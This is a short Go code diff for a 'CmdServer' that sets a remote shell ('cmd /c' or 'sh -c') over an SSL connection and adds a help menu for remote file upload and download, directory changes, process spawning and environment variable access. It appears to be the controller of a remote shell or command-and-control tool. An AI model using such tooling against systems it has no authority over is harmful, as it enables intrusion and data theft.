@@ -26,8 +26,13 @@ func NewCmdServer(conn *util.SSLConn) *CmdServer {
 	return pnew
 }
 
-func (server *CmdServer) ProcUI(scanner *bufio.Scanner) {
+func (server *CmdServer) ProcUI(iswin bool, scanner *bufio.Scanner) {
 	for {
+		if iswin {
+			util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("cmd /c"))
+		} else {
+			util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("sh -c"))
+		}
 		if !scanner.Scan() {
 			break
 		}
@@ -36,6 +41,18 @@ func (server *CmdServer) ProcUI(scanner *bufio.Scanner) {
 		}
 		cmdstr := strings.TrimSpace(scanner.Text())
 		if len(cmdstr) == 0 {
+			continue
+		}
+		if cmdstr == "help" {
+			fmt.Println(`
+upload file            --upload local file to remote working directory
+download file          --download remote file to local working directory
+cd path                --change remote working directory
+createprocess cmd arg  --start goroutine to exec command, no response
+setcmdshell cmd /c     --set remote shell
+getenv                 --get remote all env var
+setenv key=value       --set remote env var
+exit                   --exit current session`)
 			continue
 		}
 		if cmdstr == "exit" {
